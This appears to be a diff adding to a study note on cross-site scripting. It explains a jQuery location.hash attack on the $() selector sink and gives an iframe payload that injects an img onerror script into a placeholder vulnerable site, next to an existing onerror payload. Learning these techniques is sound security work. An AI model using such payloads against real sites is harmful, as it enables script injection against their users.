@@ -40,3 +40,10 @@ or, to trigger on error:
 ``` html
 <img src=1 onerror=alert(1)>
 ```
+
+A common exploit with jQuery is using `location.hash` to inject XSS into the `$()` selector sink. This is usually patched by preventing input that begins with `#` but it still possible to find.
+
+To exploit, need to trigger an iframe
+``` html
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
